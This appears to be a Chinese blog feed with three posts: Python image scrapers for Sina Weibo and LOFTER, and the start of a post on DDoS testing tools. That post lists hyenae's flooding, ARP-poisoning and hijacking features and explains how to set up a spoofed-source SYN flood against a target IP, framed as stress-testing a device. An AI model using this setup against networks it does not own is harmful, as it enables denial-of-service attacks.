                html = _get_html(imglist_url[0], headers)
                imgurls += img_pattern.findall(html)

        if not imgurls:
            print(&#39;capture complete!&#39;)
            print(&#39;captured pages:%d, blogs:%d, imgs:%d&#39; % (num_pages, num_blogs, num_imgs))
            print(&#39;directory:&#39; + path)
            break

        # 3. download all the imgs from each imgList
        print(&#39;PAGE %d with %d images&#39; % (num_pages, len(imgurls)))
        for img in imgurls:
            imgurl = img[0].replace(img[1], &#39;large&#39;)
            num_imgs += 1
            try:
                urllib.request.urlretrieve(imgurl, &#39;{}/{}.{}&#39;.format(path, num_imgs, img[2]))
                # display the raw url of images
                print(&#39;\t%d\t%s&#39; % (num_imgs, imgurl))
            except Exception as e:
                print(str(e))
                print(&#39;\t%d\t%s failed&#39; % (num_imgs, imgurl))
        num_pages += 1
        print(&#39;&#39;)


def main():
    # uids = [&#39;2657006573&#39;,&#39;2173752092&#39;,&#39;3261134763&#39;,&#39;2174219060&#39;]
    uid = &#39;2657006573&#39;
    path = _get_path(uid)

    # cookie is form the above url-&gt;network-&gt;request headers
    cookies = &#39;&#39;
    headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#39;,
            &#39;Cookie&#39;: cookies}

    # capture imgs from sina
    _capture_images(uid, headers, path)


if __name__ == &#39;__main__&#39;:
    main()

</code></pre>
<p>使用时记得修改<code>main</code>函数中的<code>cookies</code>和<code>uid</code>！</p>
<h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><p><img src="/assets/spider/sina/capturer_litreily.png" alt="capture litreily"></p>
<p><img src="/assets/spider/sina/capturer_litreily_end.png" alt="capture litreily end"></p>
<p><img src="/assets/spider/sina/captured_pictures.png" alt="captured pictures"></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><ul>
<li>该爬虫已存放至开源项目<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">capturer</a>，欢迎交流</li>
<li>由于是首个爬虫，所以许多地方有待改进，相对的<a href="http://www.litreily.top/2018/03/17/lofter/">LOFTER爬虫</a>就更娴熟写了</li>
<li>目前没有发现新浪微博有明显的反爬措施，但还是按需索取为好</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tools </tag>
            
            <tag> spider </tag>
            
            <tag> sina </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python网络爬虫1 - 爬取网易LOFTER图片]]></title>
      <url>https://www.litreily.top/2018/03/17/lofter/</url>
      <content type="html"><![CDATA[<p><code>LOFTER</code>是网易出品的优质轻博客，灵感源于国外的<code>tumblr</code>，但比之更加文艺，更加本地化。本人非常喜欢<code>LOFTER</code>的UI设计，以及其中的优质用户和内容，似乎网易并不擅长推广，所以受众并不广泛。这都是题外话，本文主要记录作者近期学习<code>python3</code>并用之爬取<code>LOFTER</code>用户图片的过程和成果，与大家交流分享。</p>
<blockquote>
<p>本文将以本人<a href="http://litreily.lofter.com" target="_blank" rel="noopener">litreily</a>博客为例说明整个爬取过程</p>
</blockquote>
<h2 id="分析LOFTER站点"><a href="#分析LOFTER站点" class="headerlink" title="分析LOFTER站点"></a>分析LOFTER站点</h2><p>在爬取站点之前，首先需要分析站点的关键信息有哪些，如果给自己提问，可能会有以下问题：</p>
<ol>
<li>用户的主页网址格式是？</li>
<li>用户博客链接的格式是？</li>
<li>每篇博客内的图片链接的格式是？</li>
<li>不同用户的主页模板不同，是否可以按同样方法抓取博客信息？</li>
<li>用户的博客数量巨大，主页以什么方式分页？</li>
<li>有没有归档页面方便爬取（大多数网站都有归档页面）？</li>
</ol>
<p>当然，这些问题不是一下子就能想出来，可以在探索网页内容的过程逐步展开，并思考下一步该考虑的问题，下面针对各个问题对主页进行探索分析。</p>
<h3 id="主页信息"><a href="#主页信息" class="headerlink" title="主页信息"></a>主页信息</h3><blockquote>
<p>主页: <code>http://[username].lofter.com</code></p>
</blockquote>
<p><img src="/assets/spider/lofter/litreily.png" alt="litreily"></p>
<p>从主页可以看到<a href="http://litreily.lofter.com/view" target="_blank" rel="noopener">归档</a>的链接，暂时不管。不同的用户，其主页所用模板不尽一致，<code>LOFTER</code>为提供了大量精美的主页模板，以满足不同用户的需求：</p>
<p><img src="/assets/spider/lofter/lofterTemplet.png" alt="lofter templet"></p>
<p>然而，正是因为所用模板不同，其网页内容格式也不同，这个从不同模板中图片的位置，大小，图片信息等就可以看出来。相同的资源，不同的展示方式，就好像同样一件艺术品，既可以摆放在玻璃框中，也可以悬挂在高空。</p>
<p>当然这不是本文重点，这里只是为了说明不同用户的主页信息展示不一样，会给爬虫爬取带来一定影响。</p>
<h3 id="分页信息"><a href="#分页信息" class="headerlink" title="分页信息"></a>分页信息</h3><p>点击主页尾部的下一页，可以跳转至下一页，除首页和末页外，都会有上一页和下一页的链接，这里就给了我们一个提示，我们可以先抓取首页信息，然后从中抓取到<strong>下一页</strong>的链接，然后不断获取<strong>下一页</strong>的博客信息。</p>
<p><img src="/assets/spider/lofter/pages.png" alt="pages"></p>
<p>或者更简单点，看网址栏中的网址格式:</p>
<blockquote>
<p>分页： <code>http://[username].lofter.com/?page=[pageNumber]&amp;t=[timeStamp]</code></p>
</blockquote>
<p>直接使用<code>for</code>循环修改<code>page</code>值，逐页爬取博客信息。这貌似是个不错的想法，好，假设这样可行，那我们来分析每一页的信息。</p>
<p><img src="/assets/spider/lofter/postLink.png" alt="post link"></p>
<p>如上图所示，首先找到博文永久链接<code>http://litreily.lofter.com/post/44fbca_1265bb3e</code></p>
<p>针对含有图片的某一篇博文，<strong>litreily</strong>所用模板中会出现两次博文链接（见图中红框标注的两处），倘若我们使用正则表达式:</p>
<pre><code class="python">re.findall(r&#39;&quot;http://.*lofter.com/post/[\w_]*&quot;&#39;, html)
</code></pre>
<p>将对每篇博文匹配出两个一样的链接，这可不是我们想要的，那咋整，匹配完再把重复的删了？不至于这么麻烦，细看两处链接前后信息，可以看到两处链接的<code>class</code>属性不一致，好办了，咱改改正则：</p>
<pre><code class="python">re.findall(r&#39;&lt;a class=&quot;img&quot; href=&quot;(http://.*lofter.com/post/[\w_]*)&quot;&gt;&#39;, html)
</code></pre>
<p>好像可以了，这不就可以按页抓取博客链接，然后接着分析每篇博文信息不就好了么。我原本就想这么干，可是当我查看了不同用户的排版以及相应的链接信息后，整个人都不好了，一千个用户就是一千个哈姆雷特啊。如果你发现有统一解析所有用户模板信息的方法，那肯定是你看的模板不够多。</p>
<p>所以呢，这条路是走不通了，至少我没再往这条路上走。打道回府，只不过重头再来，路漫漫其修远兮，吾将上下而求索。</p>
<p>靠，说了半天，原来走不通，那你说个毛线！！！淡定淡定，都是文明人，后面的风景很远，额不是，，，是很美，请耐心等待...</p>
<h3 id="归档页信息"><a href="#归档页信息" class="headerlink" title="归档页信息"></a>归档页信息</h3><blockquote>
<p>归档页：<code>http://[username].lofter.com/view</code></p>
</blockquote>
<p>好了，还记得前面说的<strong>归档</strong>吧，归档可是个好东西，它把所有博文都按日期归档，最主要的是，所有用户的归档页面都是同一个模板，不管大V小v还是普通老百姓，真的是一视同仁。剩下的问题就是<strong>如何从归档页抓取每篇博客的真实路径</strong>。</p>
<p><img src="/assets/spider/lofter/archive.png" alt="archive"></p>
<p>先来看看归档页面的结构吧，博客按月份归档，每篇博客仅显示首张图片缩略图或纯文本。然后<code>F12</code>打开调试工具，如下图所示，每个月份对应一个<code>&lt;div class=&quot;m-filecnt m-filecnt-1&quot;&gt;</code>这样的节点，每个月份节点包含了本月所有博客的入口信息，一篇博客对应一个<code>id</code>号，以及一个博客的<strong>相对路径</strong>。<code>id</code>神马的不用关心，重点就是这个<strong>相对路径</strong>，有了它不就有了博客的绝对路径了么。</p>
<ul>
<li>相对路径：&quot;/post/44fbca_1265bb3e&quot;</li>
<li>绝对路径：<code>http://[username].lofter.com/post/44fbca_1265bb3e</code></li>
</ul>
<p><img src="/assets/spider/lofter/archive_html.png" alt="archive structure"></p>
<p>这样看来，那岂不是只要抓取这一个归档页面就可以抓到所有的博客路径了呢？呵呵，真的这么容易吗？显然不大可能，当我们下拉页面时，归档信息将动态加载刷新，没错，是动态的！！！意料之中的猝不及防</p>
<p>接着我在Chrome浏览器中<code>Ctrl+U</code>看了看网页的源码（太长这就不放图了），果然不出所料，动态数据在源码中是木有的，只有一个脚本在那静静的躺着，躺着，躺着。。。难道就要放弃了吗，当然不！<strong>只要是网络通信，就必然有请求包和响应包</strong></p>
<p>那现在的问题就是，动态网页的数据是如果获取到的？动态数据的<strong>真实请求</strong>是什么？抓包看看呗，打开浏览器调试工具中的<code>Network</code>，刷新归档页，看看页面加载过程，找到真实请求，这个很好找，这类请求的后缀一般不会是png,jpg,gif,js,css等，而且多半是<strong>POST</strong>包，并且会出现在一堆图片请求的前面。</p>
<p><img src="/assets/spider/lofter/post.png" alt="post"></p>
<p>好了，找到了，就是上面这货。现在归档数据请求的链接有了，确实是<strong>POST</strong>包，同样，请求包的头部信息<code>headers</code>和请求参数<code>request payload</code>也有了。</p>
<p><img src="/assets/spider/lofter/post_values.png" alt="request values"></p>
<p>现在的关键问题是，这些请求包中的参数都是干嘛的？经我多方尝试、猜测与观察，总结如下：</p>
<pre><code class="C#">callCount=1       # 固定
scriptSessionId=${scriptSessionId}187   # 固定
httpSessionId=    # 固定
c0-scriptName=ArchiveBean       # 固定
c0-methodName=getArchivePostByTime      # 固定
c0-id=0           # 固定
c0-param0=number:4520906        # 用户ID，可从用户主页源码获取
c0-param1=number:1521342313224  # 时间戳，最最最关键参数！
c0-param2=number:50       # 单次请求博客篇数，可以按需求修改
c0-param3=boolean:false   # 固定
batchId=822456            # 6位随机数，爬取时可以固定
</code></pre>
<p>所以我们模拟请求包的时候就按这个来就可以了，至于时间戳怎么获取，请求包的<code>headers</code>如何确定，后面会有详述。</p>
<p>下面我们来看看请求后得到的响应包长啥样，look，就下面这个，看到没，<strong><code>permalink</code></strong>, 千呼万唤始出来啊，这不就是我们想要的博客固定路径了么。响应包并不是<code>html</code>文件，而是一组数据，我觉着归档页包含的那个脚本就是根据这个数据文件进而请求首张图片信息或文本信息的，当然这是我的猜测了，有兴趣的可以去看看那个脚本。</p>
<p><img src="/assets/spider/lofter/post_response.png" alt="post response"></p>
<p>有了这组数据，咱就可以获取每次请求得到的博客路径列表，进而逐一爬取博客内的图片链接了。</p>
<p>到此处为止，归档页的信息就分析完了，我们已经知道该发送怎样的请求包去获取归档数据，与此同时，我们也知道了从归档页如何获取每篇博客的真实路径。</p>
<p>下面就来看看当我们知道博客路径并抓取后，该如何获取每篇博客正文内的图片链接。</p>
<h3 id="博客页信息"><a href="#博客页信息" class="headerlink" title="博客页信息"></a>博客页信息</h3><blockquote>
<p>博客： <code>http://[username].lofter.com/post/******_********</code></p>
</blockquote>
<p>以上面获取的博客 <a href="http://litreily.lofter.com/post/33a459_1230cb50" target="_blank" rel="noopener">http://litreily.lofter.com/post/33a459_1230cb50</a> 为例，大部分博客内的图片都不止一张，这也是必须访问博客页本身的主要原因，好了照旧查看页面元素。</p>
<p><img src="/assets/spider/lofter/blog_pic.png" alt="blog pictures"></p>
<p>可以发现每篇博客内所有图片的大图链接都是上图框选中这样的，都有着同样的属性<code>bigimgsrc</code>，并且是博客页面唯一的。由于每篇博客源码内包含了该篇博客所有的图片链接，所以当我们获取了某篇博客的<code>html</code>文件后，便可以使用正则表达式获取所有图片链接。</p>
<p>至此，我们已经掌握了爬取<code>lofter</code>单用户博客图片所需的所有信息，是时候确定爬取方案了。</p>
<h2 id="确定爬取方案"><a href="#确定爬取方案" class="headerlink" title="确定爬取方案"></a>确定爬取方案</h2><p>首先，根据给定的<code>username</code>获取<code>uid</code>作为<code>POST</code>请求包数据中的一分子；然后，循环执行以下步骤直至全部爬取完成</p>
<ol>
<li>生成或更新归档页请求数据</li>
<li>模拟归档页面发送POST请求</li>
<li>解析响应数据并获取博客链接</li>
<li>逐一爬取博客内容</li>
<li>解析博客内容并获取图片链接</li>
<li>逐一下载图片至本地</li>
</ol>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>方案确定好了，那就撸起袖子加油干吧！</p>
<h3 id="依赖库"><a href="#依赖库" class="headerlink" title="依赖库"></a>依赖库</h3><ul>
<li>requests</li>
</ul>
<p>Only one! 没错，依赖的第三方库就这一个，怎么装咱这就不说了</p>
<h3 id="获取用户ID"><a href="#获取用户ID" class="headerlink" title="获取用户ID"></a>获取用户ID</h3><p>用户ID，确切的说是用户博客的唯一ID，是归档页请求报文中的参数之一，通过查看主页源码找到了相应的字符串，所以只要用<code>request.get</code>抓取首页然后匹配ID字符串就可以了，代码如下：</p>
<pre><code class="python">def _get_blogid(username):
    try:
        html = requests.get(&#39;http://%s.lofter.com&#39; % username)
        id_reg = r&#39;src=&quot;http://www.lofter.com/control\?blogId=(.*)&quot;&#39;
        blogid = re.search(id_reg, html.text).group(1)
        print(&#39;The blogid of %s is: %s&#39; % (username, blogid))
        return blogid
    except Exception as e:
        print(&#39;get blogid from http://%s.lofter.com failed&#39; % username)
        print(&#39;please check your username.&#39;)
        exit(1)
</code></pre>
<h3 id="生成POST请求数据"><a href="#生成POST请求数据" class="headerlink" title="生成POST请求数据"></a>生成POST请求数据</h3><p>根据前面归档页的分析，我们知道POST请求中除了一些固定参数外，还有用户ID，时间戳<code>timestamp</code>以及单次请求的博客篇数<code>N</code>需要确定，而ID已经在前面已经获取到了；博客篇数可以自定义一个数，如40；最后就剩下时间戳了。</p>
<p>经过多次尝试发现，这个时间戳<code>timestamp</code>是所有参数中唯一一个需要在每次请求中不断更新的参数。那么它更新的依据是什么呢？每篇博客都对应着一个<code>timestamp</code>，而且是博客的发布时间，每次请求后得到的最后一篇博客的<code>timestamp</code>就可以作为下一次请求的<code>timestamp</code>。为什么呢，因为我多次实验发现，在给定一个<code>timestamp</code>并发送POST请求后，服务器会<strong>以请求参数中的时间戳为起点按时间顺序往前检索出指定篇数(如：40)的博客信息</strong></p>
<p>响应包的博客信息中包含了每篇博客的时间戳，所以每次获取响应包后，只要解析出响应包中最后一篇博客的时间戳，就可以作为下一次请求中的时间戳。</p>
<p>根据以上分析，可以写出获取时间戳的函数如下：</p>
<pre><code class="python"># time_pattern: re.compile(&#39;s%d\.time=(.*);s.*type&#39; % (query_number-1))
def _get_timestamp(html, time_pattern):
    if not html:
        timestamp = round(time.time() * 1000)  # first timestamp(ms)
    else:
        timestamp = time_pattern.search(html).group(1)
    return str(timestamp)
</code></pre>
<blockquote>
<p>注意，首次请求的时间戳可以直接使用当前系统时间(ms)</p>
</blockquote>
<h3 id="发送POST请求包"><a href="#发送POST请求包" class="headerlink" title="发送POST请求包"></a>发送POST请求包</h3><p>POST请求包的<code>url</code>是固定的，<code>data</code>就是前面获取到的所有请求参数，<code>headers</code>如下：</p>
<pre><code class="python">headers = {
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;,
        &#39;Host&#39;: username + &#39;.lofter.com&#39;,
        &#39;Referer&#39;: &#39;http://%s.lofter.com/view&#39; % username,
        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;
    }
</code></pre>
<p>其中，<code>User-Agent</code>用于模拟浏览器请求，后面三个参数最好都加上，否则可能无法请求成功。POST请求其实就是一条语句<code>requests.post</code>，具体实现如下：</p>
<pre><code class="python">def _get_html(url, data, headers):
    try:
        html = requests.post(url, data, headers = headers)
    except Exception as e:
        print(&quot;get %s failed\n%s&quot; % (url, str(e)))
        return None
    finally:
        pass
    return html
</code></pre>
<h3 id="解析POST响应包"><a href="#解析POST响应包" class="headerlink" title="解析POST响应包"></a>解析POST响应包</h3><p>在获取响应包的文本<code>html</code>后，便可从中获取本次请求得到的所有博客的相对路径，然后生成绝对路径，进而逐一抓取博客原文，从原文中抓取所有图链。</p>
<pre><code class="python"># get urls of blogs: s3.permalink=&quot;44fbca_19a6b1b&quot;
new_blogs = blog_url_pattern.findall(html)
num_new_blogs = len(new_blogs)
num_blogs += num_new_blogs

if num_new_blogs != 0:
    print(&#39;NewBlogs:%d\tTotalBolgs:%d&#39; % (num_new_blogs, num_blogs))
    # get imgurls from new_blogs
    imgurls = []
    for blog in new_blogs:
        imgurls.extend(_get_imgurls(username, blog, headers))
    num_imgs += len(imgurls)
</code></pre>
<p>以上代码便是获取POST的响应包<code>html</code>后的解析操作，其中<code>_get_imurls</code>是用于抓取博客原文并解析出所有图链的函数。</p>
<pre><code class="python">def _get_imgurls(username, blog, headers):
    blog_url = &#39;http://%s.lofter.com/post/%s&#39; % (username, blog)
    blog_html = requests.get(blog_url, headers = headers).text
    imgurls = re.findall(r&#39;bigimgsrc=&quot;(.*?)&quot;&#39;, blog_html)
    print(&#39;Blog\t%s\twith %d\tpictures&#39; % (blog_url, len(imgurls)))
    return imgurls
</code></pre>
<h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><pre><code class="python">def _capture_images(imgurl, path):
    headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;}
    for i in range(1,3):
        try:
            image_request = requests.get(imgurl, headers = headers, timeout = 20)
            if image_request.status_code == 200:
                open(path, &#39;wb&#39;).write(image_request.content)
                break
        except requests.exceptions.ConnectionError as e:
            print(&#39;\tGet %s failed\n\terror:%s&#39; % (imgurl, e))
            if i == 1:
                imgurl = re.sub(&#39;^http://img.*?\.&#39;,&#39;http://img.&#39;,imgurl)
                print(&#39;\tRetry &#39; + imgurl)
            else:
                print(&#39;\tRetry fail&#39;)
        except Exception as e:
            print(e)
        finally:
            pass

</code></pre>
<p>有了图链，最后的工作当然是下载图片了，上面这段代码便是用来下载图片的，<code>headers</code>是为了模拟浏览器访问。那为什么要尝试下载两次呢？因为我在抓取过程中，有时候会出现抓取失败的情况，并显示以下错误信息：</p>
<pre><code class="yaml">&#39;Connection aborted.&#39;, RemoteDisconnected(&#39;Remote end closed connection without response&#39;
</code></pre>
<p>所以在<code>Retry</code>前先将图链对应的<code>host</code>稍加修改,这样可以保证更高的成功率，但并不能完全避免。对于下载失败的情况，可能是：</p>
<ol>
<li>被反爬了（极大可能）</li>
<li>网络通信不畅（可能性低）</li>
<li>图链失效</li>
<li>服务器出毛病了</li>
</ol>
<p>有时候，同样一个图链，过一段时间去抓就好了，或者换个网络就好了。我猜测是被反爬，但证据不足，所以只能降低爬取频率，比如每发送接收一次POST请求便<code>sleep</code>10s左右，但还是会有失败的情况，如果大家有更好的意见，欢迎交流。目前情况，正常情况100%爬取完全没问题，异常情况90%以上吧。</p>
<h3 id="主循环"><a href="#主循环" class="headerlink" title="主循环"></a>主循环</h3><p>好了，其它零碎的代码就不多说了，爬虫主循环流程如下，其实就是以上步骤的整合：</p>
<ol>
<li>爬取归档页面指定篇数<code>query_number</code>的博文链接<code>new_blogs</code></li>
<li>逐个爬取博文<code>blog</code>数据，获取每篇<code>blog</code>的所有大图链接<code>imgurls</code></li>
<li>逐个爬取大图链接<code>imgurls</code>,下载图片至本地目录</li>
<li>判断是否已爬取完所有博文<ul>
<li>若已爬完，则显示爬取成果信息，并退出</li>
<li>若未爬完，则更新请求包中的时间戳<code>timestamp</code>，返回第1步继续爬取新的博文</li>
</ul>
</li>
</ol>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><pre><code class="python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# date: 2018.03.07
&quot;&quot;&quot;Capture pictures from lofter with username.&quot;&quot;&quot;

import re
import os
import platform

import requests

import time
import random


def _get_path(username):
    path = {
        &#39;Windows&#39;: &#39;D:/litreily/Pictures/python/lofter/&#39; + username,
        &#39;Linux&#39;: &#39;/mnt/d/litreily/Pictures/python/lofter/&#39; + username
    }.get(platform.system())

    if not os.path.isdir(path):
        os.makedirs(path)
    return path


def _get_html(url, data, headers):
    try:
        html = requests.post(url, data, headers = headers)
    except Exception as e:
        print(&quot;get %s failed\n%s&quot; % (url, str(e)))
        return None
    finally:
        pass
    return html


def _get_blogid(username):
    try:
        html = requests.get(&#39;http://%s.lofter.com&#39; % username)
        id_reg = r&#39;src=&quot;http://www.lofter.com/control\?blogId=(.*)&quot;&#39;
        blogid = re.search(id_reg, html.text).group(1)
        print(&#39;The blogid of %s is: %s&#39; % (username, blogid))
        return blogid
    except Exception as e:
        print(&#39;get blogid from http://%s.lofter.com failed&#39; % username)
        print(&#39;please check your username.&#39;)
        exit(1)


def _get_timestamp(html, time_pattern):
    if not html:
        timestamp = round(time.time() * 1000)  # first timestamp(ms)
    else:
        timestamp = time_pattern.search(html).group(1)
    return str(timestamp)


def _get_imgurls(username, blog, headers):
    blog_url = &#39;http://%s.lofter.com/post/%s&#39; % (username, blog)
    blog_html = requests.get(blog_url, headers = headers).text
    imgurls = re.findall(r&#39;bigimgsrc=&quot;(.*?)&quot;&#39;, blog_html)
    print(&#39;Blog\t%s\twith %d\tpictures&#39; % (blog_url, len(imgurls)))
    return imgurls


def _capture_images(imgurl, path):
    headers = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;}
    for i in range(1,3):
        try:
            image_request = requests.get(imgurl, headers = headers, timeout = 20)
            if image_request.status_code == 200:
                open(path, &#39;wb&#39;).write(image_request.content)
                break
        except requests.exceptions.ConnectionError as e:
            print(&#39;\tGet %s failed\n\terror:%s&#39; % (imgurl, e))
            if i == 1:
                imgurl = re.sub(&#39;^http://img.*?\.&#39;,&#39;http://img.&#39;,imgurl)
                print(&#39;\tRetry &#39; + imgurl)
            else:
                print(&#39;\tRetry fail&#39;)
        except Exception as e:
            print(e)
        finally:
            pass


def _create_query_data(blogid, timestamp, query_number):
    data = {&#39;callCount&#39;:&#39;1&#39;,
    &#39;scriptSessionId&#39;:&#39;${scriptSessionId}187&#39;,
    &#39;httpSessionId&#39;:&#39;&#39;,
    &#39;c0-scriptName&#39;:&#39;ArchiveBean&#39;,
    &#39;c0-methodName&#39;:&#39;getArchivePostByTime&#39;,
    &#39;c0-id&#39;:&#39;0&#39;,
    &#39;c0-param0&#39;:&#39;number:&#39; + blogid,
    &#39;c0-param1&#39;:&#39;number:&#39; + timestamp,
    &#39;c0-param2&#39;:&#39;number:&#39; + query_number,
    &#39;c0-param3&#39;:&#39;boolean:false&#39;,
    &#39;batchId&#39;:&#39;123456&#39;}
    return data


def main():
    # prepare paramters
    username = &#39;litreily&#39;
    blogid = _get_blogid(username)
    query_number = 40
    time_pattern = re.compile(&#39;s%d\.time=(.*);s.*type&#39; % (query_number-1))
    blog_url_pattern = re.compile(r&#39;s[\d]*\.permalink=&quot;([\w_]*)&quot;&#39;)

    # creat path to save imgs
    path = _get_path(username)

    # parameters of post packet
    url = &#39;http://%s.lofter.com/dwr/call/plaincall/ArchiveBean.getArchivePostByTime.dwr&#39; % username
    data = _create_query_data(blogid, _get_timestamp(None, time_pattern), str(query_number))
    headers = {
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&#39;,
        &#39;Host&#39;: username + &#39;.lofter.com&#39;,
        &#39;Referer&#39;: &#39;http://%s.lofter.com/view&#39; % username,
        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;
    }

    num_blogs = 0
    num_imgs = 0
    index_img = 0
    print(&#39;------------------------------- start line ------------------------------&#39;)
    while True:
        html = _get_html(url, data, headers).text
        # get urls of blogs: s3.permalink=&quot;44fbca_19a6b1b&quot;
        new_blogs = blog_url_pattern.findall(html)
        num_new_blogs = len(new_blogs)
        num_blogs += num_new_blogs

        if num_new_blogs != 0:
            print(&#39;NewBlogs:%d\tTotalBolgs:%d&#39; % (num_new_blogs, num_blogs))
            # get imgurls from new_blogs
            imgurls = []
            for blog in new_blogs:
                imgurls.extend(_get_imgurls(username, blog, headers))
            num_imgs += len(imgurls)

            # download imgs
            for imgurl in imgurls:
                index_img += 1
                paths = &#39;%s/%d.%s&#39; % (path, index_img, re.search(r&#39;(jpg|png|gif)&#39;, imgurl).group(0))
                print(&#39;{}\t{}&#39;.format(index_img, paths))
                _capture_images(imgurl, paths)

        if num_new_blogs != query_number:
            print(&#39;------------------------------- stop line -------------------------------&#39;)
            print(&#39;capture complete!&#39;)
            print(&#39;captured blogs:%d images:%d&#39; % (num_blogs, num_imgs))
            print(&#39;download path:&#39; + path)
            print(&#39;-------------------------------------------------------------------------&#39;)
            break

        data[&#39;c0-param1&#39;] = &#39;number:&#39; + _get_timestamp(html, time_pattern)
        print(&#39;The next TimeStamp is : %s\n&#39; % data[&#39;c0-param1&#39;].split(&#39;:&#39;)[1])
        # wait a few second
        time.sleep(random.randint(5,10))


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><p><img src="/assets/spider/lofter/lofter_spider.png" alt="lofter spider"></p>
<p><img src="/assets/spider/lofter/pictures.png" alt="pictures"></p>
<h2 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h2><ul>
<li>Github 源码：<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">https://github.com/Litreily/capturer</a></li>
<li>欢迎交流探讨与STAR</li>
<li>请节制使用！</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tools </tag>
            
            <tag> spider </tag>
            
            <tag> lofter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[两款实用的DDos攻击工具]]></title>
      <url>https://www.litreily.top/2018/02/22/ddos-attack/</url>
      <content type="html"><![CDATA[<p>之前为了重现某个bug，需要对网络设备进行ddos攻击测试，同时也是对设备的网络攻击防护功能进行抗压测试。临阵磨枪，google了两款攻击工具，windows平台的<code>hyenae</code>，以及Linux平台的<code>hping3</code>，在此记录一下两者的用法。</p>
<h2 id="Hyenae"><a href="#Hyenae" class="headerlink" title="Hyenae"></a>Hyenae</h2><p><code>hyenae</code>是在<code>Windows</code>平台上非常好用的一款<code>ddos</code>攻击工具，可以完成绝大多数的攻击操作。</p>
<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><ul>
<li><a href="https://sourceforge.net/projects/hyenae/" target="_blank" rel="noopener">https://sourceforge.net/projects/hyenae/</a></li>
</ul>
<h3 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h3><ul>
<li>ARP-Request flooding</li>
<li>ARP-Cache poisoning</li>
<li>PPPoE session initiation flooding</li>
<li>Blind PPPoE session termination</li>
<li>ICMP-Echo flooding</li>
<li>ICMP-Smurf attack</li>
<li>ICMP based TCP-Connection reset</li>
<li>TCP-SYN flooding</li>
<li>TCP-Land attack</li>
<li>Blind TCP-Connection reset</li>
<li>UDP flooding</li>
<li>DNS-Query flooding</li>
<li>DHCP-Discover flooding</li>
<li>DHCP starvation attack</li>
<li>DHCP-Release forcing</li>
<li>Cisco HSRP active router hijacking</li>
<li>Pattern based packet address configuration</li>
<li>Intelligent address and address protocol detection</li>
<li>Smart wildcard-based randomization</li>
<li>Daemon for setting up remote attack networks - HyenaeFE QT-Frontend support</li>
</ul>
<h3 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h3><p><img src="/assets/network/hyenae-interface.png" alt="hyenae interface"></p>
<p><code>hyenae</code>的界面比较简单，图中展示的是<code>SYN/ACK</code>洪泛攻击的配置选项。</p>
<ul>
<li><code>operation mode</code>中可以选择网卡</li>
<li><code>Network Protocol</code>中可以选择攻击方式对应的网络协议，如<code>SYN</code>洪泛攻击对应传输层的<code>TCP</code>，<code>IP</code>协议可选<code>IPv4, IPv6</code></li>
<li>攻击源的<code>IP</code>,<code>MAC</code>地址以及端口号可以非常灵活的设置，按<code>MAC-IP@port</code>的格式书写，如图中的攻击源匹配模式<code>%-172.17.14.158@80</code><ul>
<li>% 代表任意，在此处代表任意的MAC地址</li>
<li>172.17.14.158为伪造的攻击源IP，可以修改为任意的合法IP</li>
<li>80为端口号，80同时也是网络服务器的默认端口</li>
</ul>
</li>
<li>攻击目标的设置方式与攻击源一致，图中的<code>%-172.17.14.10@80</code><ul>
<li>% 随机生成MAC地址</li>
<li>172.17.14.10代表被攻击的IP</li>
<li>80为攻击目标的被攻击端口号</li>
</ul>
</li>
<li>针对<code>TCP</code>协议，右侧给出其对应的<code>5</code>个常见<code>flags</code>: <code>FIN, SYN, RST, PSH, ACK</code><ul>
<li>可以随意进行单选或多选，以实现不同的攻击方式</li>
<li>随意的组合可以产生正常通信过程中无法出现的数据包</li>
</ul>
</li>
<li>软件下方可以设置数据包的发送速率，默认为无限速发送，这会暂用大量带宽，导致网络拥塞；当然啦，这个软件本就是为了攻击网络，导致网络瘫痪正是其目的所在</li>
<li>选择不同的攻击方式，会显示相应不同的配置选项</li>
</ul>
<p>简单说，这幅图的作用是产生<code>MAC</code>地址随机，<code>IP</code>为<code>172.17.14.158</code>，端口为80的伪造源，去攻击目的<code>MAC</code>随机，<code>IP</code>为<code>172.17.14.10</code>的<code>web server</code>。</p>
